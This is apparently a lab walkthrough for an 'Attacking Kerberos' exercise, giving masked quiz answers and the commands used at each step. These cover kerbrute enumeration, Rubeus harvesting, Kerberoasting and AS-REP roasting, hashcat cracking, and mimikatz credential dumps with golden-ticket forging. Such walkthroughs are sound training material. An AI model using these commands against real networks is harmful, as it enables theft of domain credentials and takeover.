# Attacking Kerberos

- What does TGT stand for?

	- `ticket granting ticket`

- What does SPN stand for?

	- `service principal name`

- What does PAC stand for?

	- `privilege attribute certificate`

- What two services make up the KDC?

	- `AS, TGS`

- Deploy the Machine

	  no answer needed

- How many total users do we enumerate?

	- `sudo vim /etc/hosts`, insert the row `<TARGET_IP>	CONTROLLER.local`
	- Download [User.txt](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt)
	- `kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt`
	- `**`

- What is the SQL service account name?

	- `sql*******`

- What is the second "machine" account name?

	- `*******2`

- What is the third "user" account name?

	- `****3`

- Which domain admin do we get a ticket for when harvesting tickets?

	- `ssh Administrator@controller.local`, `yes` and inters password.
	- `cd Downloads`
	- `Rubeus.exe harvest /interval:30`
	- `echo <TARGET_IP> CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
	- `Rubeus.exe brute /password:Password1 /noticket`
	- `Ad************`

- Which domain controller do we get a ticket for when harvesting tickets?

	- `**********-1`

- What is the HTTPService Password?

	- `cd Downloads`
	- `Rubeus.exe kerberoast`
	- `copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat`
	- [wordlist](https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt)
	- `hashcat -m 13100 -a 0 hash.txt Pass.txt`
	- `**********`

- What is the SQLService Password?

	- `**************`

- What hash type does AS-REP Roasting use?

	- `cd Downloads`
	- `Rubeus.exe asreproast`
	- `Transfer the hash from the target machine over to your attacker machine and put the hash into a txt file`
	- `Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....`
	- `hashcat -m 18200 hash.txt Pass.txt`
	- `Kerberos * ****** ***** **`

- Which User is vulnerable to AS-REP Roasting?

	- `****3`

- What is the User's Password?

	- `*********3`

- Which Admin is vulnerable to AS-REP Roasting?

	- `*****2`

- What is the Admin's Password?

	- `**********`

- I understand how a pass the ticket attack works

	  no answer needed

- What is the SQLService NTLM Hash?

	- `cd downloads && mimikatz.exe`
	- `privilege::debug`
	- `lsadump::lsa /inject /name:krbtgt`
	- `Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:`
	- `misc::cmd`
	- `****************************`

- What is the Administrator NTLM Hash?

	- `****************************`

- I understand how to implant a skeleton key into a domain controller with mimikatz

	  no answer needed

- I Understand the Basics of Attacking Kerberos

	  no answer needed
